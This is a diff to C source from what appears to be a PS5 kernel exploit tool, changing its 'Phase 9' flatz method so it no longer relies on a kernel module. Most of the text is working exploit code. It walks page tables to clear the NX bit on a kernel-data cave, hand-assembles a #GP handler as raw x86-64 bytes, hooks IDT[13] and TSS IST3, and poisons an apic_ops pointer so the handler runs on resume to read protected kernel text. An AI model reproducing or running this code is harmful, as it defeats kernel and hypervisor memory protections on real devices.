@@ -5846,12 +5846,17 @@ static void campaign_flatz_setup(void) {
 
         /* ─── Phase 9: Arm flatz method (#GP hook + pointer poison) ───
          *
-         * Using the kmod's gp_handler (executable kernel code) as the
-         * IDT[13] handler.  When #GP fires during resume:
+         * Build the #GP handler inline and write it to a kdata cave.
+         * No kmod dependency — handler machine code is constructed with
+         * actual addresses baked in (no relocations needed).
+         *
+         * The kdata cave page has its guest PTE NX-bit cleared so the
+         * handler is executable during early resume (before HV sets
+         * up NPT).  When #GP fires during resume:
          *   1. CPU switches to IST3 stack (in our cave)
-         *   2. gp_handler reads ktext (proof of readability)
-         *   3. gp_handler restores original IDT[13]
-         *   4. gp_handler restores original apic_ops[2]
+         *   2. Handler reads ktext (proof of readability)
+         *   3. Handler restores original IDT[13] from backup
+         *   4. Handler restores original apic_ops[2]
          *   5. iretq re-executes the call (now valid)
          *
          * Key PS5 values (from ps5-kstuff):
@@ -5861,15 +5866,10 @@ static void campaign_flatz_setup(void) {
          *   Poison prefix = 0xdeb7 (replaces top 16 bits)
          */
         printf("\n=============================================\n");
-        printf("  Phase 9: Arm Flatz Method\n");
+        printf("  Phase 9: Arm Flatz Method (inline handler)\n");
         printf("=============================================\n\n");
         fflush(stdout);
 
-        if (!g_kmod_gp_handler) {
-            printf("[-] No gp_handler KVA from kmod — cannot arm Phase 9.\n");
-            fflush(stdout);
-            return;
-        }
         if (!idt_pa || !tss_pa) {
             printf("[-] IDT/TSS PA not resolved — cannot arm Phase 9.\n");
             fflush(stdout);
@@ -5893,13 +5893,15 @@ static void campaign_flatz_setup(void) {
         #define P9_MARKER_MAGIC 0x50484153453921ULL  /* "PHASE9!" */
 
         uint64_t cave_candidates[] = {
-            KSTUFF_TSS_OFF + 16 * 0x68 + 0x50,  /* after all TSS entries */
+            0x1000,                                  /* kdata+0x1000 (proven 4096B zero cave) */
+            KSTUFF_TSS_OFF + 16 * 0x68 + 0x50,      /* after all TSS entries */
             KSTUFF_GDT_OFF + 0x1000,
             KSTUFF_QA_FLAGS_OFF + 0x1000,
         };
+        int n_cave_candidates = sizeof(cave_candidates) / sizeof(cave_candidates[0]);
         uint64_t cave_kva = 0, cave_pa = 0;
         uint8_t probe[CAVE_SIZE];
-        for (int ci = 0; ci < 3; ci++) {
+        for (int ci = 0; ci < n_cave_candidates; ci++) {
             uint64_t kva = g_kdata_base + cave_candidates[ci];
             uint64_t pa  = va_to_pa_quiet(kva);
             if (!pa) continue;
@@ -5931,88 +5933,269 @@ static void campaign_flatz_setup(void) {
          *   0x000-0x0FF: IST3 stack (grows downward from cave+0x100)
          *   0x100-0x10F: original IDT[13] backup (16 bytes)
          *   0x110-0x117: original xapic_mode value (8 bytes)
-         *   0x118-0x11F: ktext proof (written by gp_handler)
+         *   0x118-0x11F: ktext proof (written by handler)
          *   0x120-0x127: phase 9 marker (P9_MARKER_MAGIC)
-         *   0x128-0x12F: gp_handler KVA (for post-resume diagnostics)
+         *   0x128-0x12F: handler KVA (for post-resume diagnostics)
+         *   0x130-0x137: original IST3
+         *   0x180-0x1DB: handler code (~92 bytes)
          */
         uint64_t cave_dmap = g_dmap_base + cave_pa;
 
-        /* Write IDT[13] backup to cave+0x100 */
+        /* ── Clear NX on the cave page's guest PTE ──
+         *
+         * Walk guest page tables (from CR3) to find the PTE for the
+         * cave page.  Clear NX (bit 63) and G (bit 8) so the handler
+         * is executable during early resume before HV sets up NPT.
+         * The PTE NX-clear attack is proven to work on this PS5. */
+        printf("[*] Walking guest PT to find PTE for cave page...\n");
+        {
+            uint64_t target = cave_kva;
+            uint64_t walk_e, walk_pa;
+
+            /* PML4 */
+            walk_pa = g_cr3_phys + ((target >> 39) & 0x1FF) * 8;
+            kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
+            if (!(walk_e & PTE_PRESENT)) {
+                printf("[-] PML4E not present for cave — aborting.\n");
+                fflush(stdout);
+                return;
+            }
+
+            /* PDP */
+            walk_pa = (walk_e & PTE_PA_MASK) + ((target >> 30) & 0x1FF) * 8;
+            kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
+            if (!(walk_e & PTE_PRESENT)) {
+                printf("[-] PDPE not present for cave — aborting.\n");
+                fflush(stdout);
+                return;
+            }
+            if (walk_e & PTE_PS) {
+                printf("[-] Cave mapped as 1GB page — cannot clear NX per-page.\n");
+                fflush(stdout);
+                return;
+            }
+
+            /* PD */
+            walk_pa = (walk_e & PTE_PA_MASK) + ((target >> 21) & 0x1FF) * 8;
+            kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
+            if (!(walk_e & PTE_PRESENT)) {
+                printf("[-] PDE not present for cave — aborting.\n");
+                fflush(stdout);
+                return;
+            }
+
+            uint64_t cave_pte_pa;
+            uint64_t cave_orig_pte;
+            if (walk_e & PTE_PS) {
+                /* 2MB page — PDE is the final entry */
+                cave_pte_pa = walk_pa;
+                cave_orig_pte = walk_e;
+                printf("[*] Cave mapped as 2MB page (PDE at PA 0x%lx)\n",
+                       (unsigned long)cave_pte_pa);
+            } else {
+                /* 4KB page — walk to PT level */
+                walk_pa = (walk_e & PTE_PA_MASK) + ((target >> 12) & 0x1FF) * 8;
+                kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
+                if (!(walk_e & PTE_PRESENT)) {
+                    printf("[-] PTE not present for cave — aborting.\n");
+                    fflush(stdout);
+                    return;
+                }
+                cave_pte_pa = walk_pa;
+                cave_orig_pte = walk_e;
+            }
+
+            printf("[*] Cave PTE at PA 0x%lx: 0x%016lx\n",
+                   (unsigned long)cave_pte_pa, (unsigned long)cave_orig_pte);
+            printf("    NX=%d RW=%d G=%d\n",
+                   (int)(cave_orig_pte >> 63),
+                   (int)((cave_orig_pte >> 1) & 1),
+                   (int)((cave_orig_pte >> 8) & 1));
+
+            if (cave_orig_pte >> 63) {
+                /* Clear NX (bit 63) and G (bit 8) */
+                uint64_t cave_new_pte = cave_orig_pte &
+                                        ~((1ULL << 63) | (1ULL << 8));
+                kernel_copyin(&cave_new_pte, g_dmap_base + cave_pte_pa, 8);
+
+                /* Verify */
+                uint64_t pte_rb;
+                kernel_copyout(g_dmap_base + cave_pte_pa, &pte_rb, 8);
+                if (pte_rb != cave_new_pte) {
+                    printf("[-] PTE NX-clear FAILED — aborting Phase 9.\n");
+                    /* Restore original PTE */
+                    kernel_copyin(&cave_orig_pte,
+                                  g_dmap_base + cave_pte_pa, 8);
+                    fflush(stdout);
+                    return;
+                }
+                printf("[+] Cave PTE NX cleared: 0x%016lx → 0x%016lx\n",
+                       (unsigned long)cave_orig_pte,
+                       (unsigned long)cave_new_pte);
+            } else {
+                printf("[+] Cave PTE already executable (NX=0)\n");
+            }
+        }
+
+        /* ── Build #GP handler machine code inline ──
+         *
+         * Handler addresses (baked in, no relocations):
+         *   ktext_read_addr  = g_ktext_base (read 8 bytes as proof)
+         *   proof_addr       = cave_kva + 0x118 (kdata VA, writable during resume)
+         *   idt_backup_addr  = cave_kva + 0x100 (kdata VA, readable)
+         *   idt13_addr       = DMAP addr of IDT[13] (writable)
+         *   orig_xapic_value = ops[2] VALUE (not an address)
+         *   apic_ops2_addr   = DMAP addr of apic_ops[2] (writable)
+         *
+         * Note: During early resume (before HV init), DMAP addresses
+         * are writable because NPT isn't set up yet.  The kdata VAs
+         * (cave_kva+offset) are readable because kdata has RW=1.
+         *
+         * Machine code:
+         *   push rax; push rcx; push rsi; push rdi; cld
+         *   movabs $ktext_read_addr, %rsi
+         *   mov (%rsi), %rax
+         *   movabs $proof_addr, %rdi
+         *   mov %rax, (%rdi)
+         *   movabs $idt_backup_addr, %rsi
+         *   movabs $idt13_addr, %rdi
+         *   mov $16, %ecx
+         *   rep movsb
+         *   movabs $orig_xapic_value, %rax
+         *   movabs $apic_ops2_addr, %rdi
+         *   mov %rax, (%rdi)
+         *   pop rdi; pop rsi; pop rcx; pop rax
+         *   add $8, %rsp     ; pop error code
+         *   iretq
+         */
+        uint64_t ktext_read_addr  = g_ktext_base;
+        uint64_t proof_addr       = cave_kva + 0x118;
+        uint64_t idt_backup_addr  = cave_kva + 0x100;
+        uint64_t idt13_dmap_addr  = g_dmap_base + idt_pa + 16 * 13;
+        uint64_t orig_xapic_value = original_xapic;
+        uint64_t apic_ops2_dmap   = g_dmap_base + ops_pa + 2 * 8;
+
+        uint8_t handler_code[128];
+        int hc = 0;
+
+        /* push rax */
+        handler_code[hc++] = 0x50;
+        /* push rcx */
+        handler_code[hc++] = 0x51;
+        /* push rsi */
+        handler_code[hc++] = 0x56;
+        /* push rdi */
+        handler_code[hc++] = 0x57;
+        /* cld */
+        handler_code[hc++] = 0xFC;
+
+        /* movabs $ktext_read_addr, %rsi */
+        handler_code[hc++] = 0x48; handler_code[hc++] = 0xBE;
+        memcpy(&handler_code[hc], &ktext_read_addr, 8); hc += 8;
+
+        /* mov (%rsi), %rax */
+        handler_code[hc++] = 0x48; handler_code[hc++] = 0x8B;
+        handler_code[hc++] = 0x06;
+
+        /* movabs $proof_addr, %rdi */
+        handler_code[hc++] = 0x48; handler_code[hc++] = 0xBF;
+        memcpy(&handler_code[hc], &proof_addr, 8); hc += 8;
+
+        /* mov %rax, (%rdi) */
+        handler_code[hc++] = 0x48; handler_code[hc++] = 0x89;
+        handler_code[hc++] = 0x07;
+
+        /* movabs $idt_backup_addr, %rsi */
+        handler_code[hc++] = 0x48; handler_code[hc++] = 0xBE;
+        memcpy(&handler_code[hc], &idt_backup_addr, 8); hc += 8;
+
+        /* movabs $idt13_dmap_addr, %rdi */
+        handler_code[hc++] = 0x48; handler_code[hc++] = 0xBF;
+        memcpy(&handler_code[hc], &idt13_dmap_addr, 8); hc += 8;
+
+        /* mov $16, %ecx */
+        handler_code[hc++] = 0xB9;
+        handler_code[hc++] = 0x10; handler_code[hc++] = 0x00;
+        handler_code[hc++] = 0x00; handler_code[hc++] = 0x00;
+
+        /* rep movsb */
+        handler_code[hc++] = 0xF3; handler_code[hc++] = 0xA4;
+
+        /* movabs $orig_xapic_value, %rax */
+        handler_code[hc++] = 0x48; handler_code[hc++] = 0xB8;
+        memcpy(&handler_code[hc], &orig_xapic_value, 8); hc += 8;
+
+        /* movabs $apic_ops2_dmap, %rdi */
+        handler_code[hc++] = 0x48; handler_code[hc++] = 0xBF;
+        memcpy(&handler_code[hc], &apic_ops2_dmap, 8); hc += 8;
+
+        /* mov %rax, (%rdi) */
+        handler_code[hc++] = 0x48; handler_code[hc++] = 0x89;
+        handler_code[hc++] = 0x07;
+
+        /* pop rdi */
+        handler_code[hc++] = 0x5F;
+        /* pop rsi */
+        handler_code[hc++] = 0x5E;
+        /* pop rcx */
+        handler_code[hc++] = 0x59;
+        /* pop rax */
+        handler_code[hc++] = 0x58;
+
+        /* add $8, %rsp  (pop error code pushed by #GP) */
+        handler_code[hc++] = 0x48; handler_code[hc++] = 0x83;
+        handler_code[hc++] = 0xC4; handler_code[hc++] = 0x08;
+
+        /* iretq */
+        handler_code[hc++] = 0x48; handler_code[hc++] = 0xCF;
+
+        printf("[+] Built %d-byte #GP handler inline\n", hc);
+        printf("    ktext_read  = 0x%lx\n", (unsigned long)ktext_read_addr);
+        printf("    proof_slot  = 0x%lx\n", (unsigned long)proof_addr);
+        printf("    idt_backup  = 0x%lx\n", (unsigned long)idt_backup_addr);
+        printf("    idt13_dmap  = 0x%lx\n", (unsigned long)idt13_dmap_addr);
+        printf("    xapic_value = 0x%016lx\n", (unsigned long)orig_xapic_value);
+        printf("    ops2_dmap   = 0x%lx\n", (unsigned long)apic_ops2_dmap);
+
+        /* Write handler to cave+0x180 via DMAP */
+        uint64_t handler_kva = cave_kva + 0x180;
+        kernel_copyin(handler_code, cave_dmap + 0x180, hc);
+
+        /* Verify handler write */
+        uint8_t handler_verify[128];
+        kernel_copyout(cave_dmap + 0x180, handler_verify, hc);
+        if (memcmp(handler_code, handler_verify, hc)) {
+            printf("[-] Handler write verification FAILED — aborting.\n");
+            fflush(stdout);
+            return;
+        }
+        printf("[+] Handler written to cave+0x180, verified OK\n");
+
+        /* Dump handler bytes for debugging */
+        printf("    Bytes: ");
+        for (int i = 0; i < hc; i++) printf("%02x ", handler_code[i]);
+        printf("\n");
+
+        /* Write cave metadata */
+        /* IDT[13] backup at cave+0x100 */
         kernel_copyin(idt13_orig, cave_dmap + 0x100, 16);
 
-        /* Write original xapic value to cave+0x110 */
+        /* Original xapic value at cave+0x110 */
         kernel_copyin(&original_xapic, cave_dmap + 0x110, 8);
 
-        /* Write Phase 9 marker to cave+0x120 */
+        /* Phase 9 marker at cave+0x120 */
         uint64_t p9_magic = P9_MARKER_MAGIC;
         kernel_copyin(&p9_magic, cave_dmap + 0x120, 8);
 
-        /* Write gp_handler KVA to cave+0x128 */
-        kernel_copyin(&g_kmod_gp_handler, cave_dmap + 0x128, 8);
+        /* Handler KVA at cave+0x128 */
+        kernel_copyin(&handler_kva, cave_dmap + 0x128, 8);
 
         printf("[+] Cave data written (IDT backup, xapic, markers)\n");
 
-        /* ── Patch gp_handler's magic values via DMAP ── */
-        uint64_t gp_pa = va_to_pa_quiet(g_kmod_gp_handler);
-        if (!gp_pa) {
-            printf("[-] gp_handler VA→PA failed — aborting.\n");
-            fflush(stdout);
-            return;
-        }
-        uint64_t gp_dmap = g_dmap_base + gp_pa;
-
-        /* Read handler bytes and patch each magic value */
-        uint8_t handler_code[0x60];  /* handler is ~90 bytes */
-        kernel_copyout(gp_dmap, handler_code, sizeof(handler_code));
-
-        struct {
-            uint64_t magic;
-            uint64_t replacement;
-        } patches[] = {
-            { 0xDEAD000000000001ULL, g_ktext_base },            /* ktext addr to read */
-            { 0xDEAD000000000002ULL, cave_dmap + 0x118 },       /* proof write slot */
-            { 0xDEAD000000000003ULL, cave_dmap + 0x100 },       /* IDT backup source */
-            { 0xDEAD000000000004ULL, g_dmap_base + idt_pa + 16 * 13 }, /* IDT[13] dest */
-            { 0xDEAD000000000005ULL, original_xapic },          /* original xapic VALUE */
-            { 0xDEAD000000000006ULL, g_dmap_base + ops_pa + 2 * 8 },  /* apic_ops[2] addr */
-        };
-        int patches_applied = 0;
-        for (int pi = 0; pi < 6; pi++) {
-            for (int off = 0; off <= (int)sizeof(handler_code) - 8; off++) {
-                uint64_t val;
-                memcpy(&val, &handler_code[off], 8);
-                if (val == patches[pi].magic) {
-                    memcpy(&handler_code[off], &patches[pi].replacement, 8);
-                    patches_applied++;
-                    break;
-                }
-            }
-        }
-        if (patches_applied != 6) {
-            printf("[-] Only patched %d/6 magic values — aborting.\n",
-                   patches_applied);
-            fflush(stdout);
-            return;
-        }
-
-        /* Write patched handler back */
-        kernel_copyin(handler_code, gp_dmap, sizeof(handler_code));
-
-        /* Verify the write */
-        uint8_t handler_verify[0x60];
-        kernel_copyout(gp_dmap, handler_verify, sizeof(handler_verify));
-        if (memcmp(handler_code, handler_verify, sizeof(handler_code))) {
-            printf("[-] Handler patch verification FAILED — aborting.\n");
-            fflush(stdout);
-            return;
-        }
-        printf("[+] gp_handler patched (%d/6 magic values replaced)\n",
-               patches_applied);
-
-        /* ── Patch IDT[13]: handler → gp_handler, IST = 3 ── */
+        /* ── Patch IDT[13]: handler → cave handler, IST = 3 ── */
         uint8_t idt13_new[16];
         memcpy(idt13_new, idt13_orig, 16);
-        uint64_t h = g_kmod_gp_handler;
+        uint64_t h = handler_kva;
         uint16_t h_lo = h & 0xFFFF;
         uint16_t h_mid = (h >> 16) & 0xFFFF;
         uint32_t h_hi = (h >> 32) & 0xFFFFFFFF;
@@ -6033,7 +6216,8 @@ static void campaign_flatz_setup(void) {
             fflush(stdout);
             return;
         }
-        printf("[+] IDT[13] patched → gp_handler (IST=3)\n");
+        printf("[+] IDT[13] patched → handler @ 0x%lx (IST=3)\n",
+               (unsigned long)handler_kva);
 
         /* ── Set TSS IST3 for all CPUs → cave stack top ── */
         uint64_t ist3_target = cave_kva + 0x100;  /* stack grows DOWN from here */
@@ -6074,19 +6258,22 @@ static void campaign_flatz_setup(void) {
 
         printf("\n[+] ============================================\n");
         printf("[+]  PHASE 9 ARMED — FLATZ METHOD READY\n");
+        printf("[+]  (inline handler, no kmod dependency)\n");
         printf("[+] ============================================\n");
         printf("[+]\n");
-        printf("[+]  IDT[13] → gp_handler @ 0x%lx (IST=3)\n",
-               (unsigned long)g_kmod_gp_handler);
-        printf("[+]  IST3    → cave+0x100 @ 0x%lx\n",
+        printf("[+]  Handler  → cave+0x180 @ 0x%lx (%d bytes)\n",
+               (unsigned long)handler_kva, hc);
+        printf("[+]  IDT[13]  → handler (IST=3)\n");
+        printf("[+]  IST3     → cave+0x100 @ 0x%lx\n",
                (unsigned long)ist3_target);
         printf("[+]  apic_ops[2] = 0x%016lx (poisoned)\n",
                (unsigned long)poisoned);
         printf("[+]  Original xapic: 0x%016lx (backed up)\n",
                (unsigned long)original_xapic);
+        printf("[+]  Cave PTE NX cleared — handler executable\n");
         printf("[+]\n");
         printf("[+]  Enter REST MODE now!\n");
-        printf("[+]  On resume: xapic_mode() → #GP → gp_handler\n");
+        printf("[+]  On resume: xapic_mode() → #GP → handler\n");
         printf("[+]  → reads ktext proof → restores IDT → restores ptr\n");
         printf("[+]  → iretq → call succeeds → normal boot\n");
 
